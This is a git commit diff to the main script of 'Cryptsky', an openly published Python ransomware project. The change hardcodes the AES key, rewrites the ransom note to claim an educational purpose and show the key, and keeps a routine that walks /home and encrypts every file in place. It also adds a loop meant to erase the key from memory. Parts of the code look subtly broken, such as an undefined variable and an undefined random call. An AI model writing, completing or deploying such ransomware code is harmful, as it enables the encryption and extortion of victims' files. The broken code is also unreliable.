135ac89872fcc1706d225985aa600f9db7768e34
Skyler Curtis <skylerr.curtis@gmail.com>
2017-10-24 10:37:28 +0000

    change decrypt message and hardcode key

--- main.py
+++ main.py
@@ -1,7 +1,6 @@
 #!/usr/bin/env python
 from Crypto.Cipher import AES
 from Crypto.Util import Counter
-from base64 import b64encode, b64decode
 import argparse
 import os
 
@@ -17,6 +16,10 @@ def get_parser():
     return parser
 
 def main():
+    # this part would not normally exist
+    # it is here to avoid the complicated key generation
+    hardcoded_key = 'yellow submarine'
+
     parser  = get_parser()
     args    = vars(parser.parse_args())
     decrypt = args['decrypt']
@@ -25,35 +28,43 @@ def main():
         print '''
         Cryptsky!
         ---------------
-        Your files have been encrypted. This is the part where I tell you how to pay and obtain the key.
-        To identify which key belongs to this machine, so that you get the correct decryption key,
-        a unique identifier has been created for you.
+        Your files have been encrypted. This is normally the part where I would
+        tell you to pay a ransom, and I will send you the decryption key. However, this
+        is an open source project to show how easy malware can be to write and to allow
+        others to view what may be one of the first fully open source python ransomwares.
 
-        your identifier is: 14765.
+        This project does not aim to be malicious. The decryption key can be found
+        below, free of charge. Please be sure to type it in EXACTLY, or you risk losing
+        your files forever. Do not include the surrounding quotes, but do make sure
+        to match case, special characters, and anything else EXACTLY!
+        Happy decrypting and be more careful next time!
 
-        Please provide this when asked.
-        you will in turn be given a string of letters and numbers. Please type it in exactly.
-        Capitalization is important, and typing it wrong will result in failed decryption of your files,
-        destroying them forever. Decryption keys are specific to each computer and using a key on the
-        wrong computer will also result in permanent loss of files. Please double check. Decryption keys
-        must be purchased for every computer you wish to recover.
+        Your decryption key is: '{}'
 
-        '''
-        key = b64decode(raw_input('Enter Your Key> '))
+        '''.format(hardcoded_key)
+        key = raw_input('Enter Your Key> ')
 
     else:
-        key = 'yellow submarine'
+        # In real ransomware, this part includes complicated key generation,
+        # sending the key back to attackers and more
+        # maybe I'll do that later. but for now, this will do.
+        key = hardcoded_key
 
     ctr = Counter.new(128)
     crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
 
-    startdir = '/home' # the directory to start in
-    for file in walk.walking(startdir):
-        modify.modify_file_inplace(file, crypt.encrypt)
+    # change this to fit your needs.
+    startdirs = ['/home']
 
+    for dirs in startdirs:
+        for file in walk.discoverFiles(startdir):
+            modify.modify_file_inplace(file, crypt.encrypt)
+            #os.rename(file, file+'.Cryptsky') # append filename to indicate crypted
+
+    # This wipes the key out of memory
+    # to avoid recovery by third party tools
     for _ in range(100):
-        pass
-        #key = random(32)
+        key = random(32)
 
     if not decrypt:
         pass
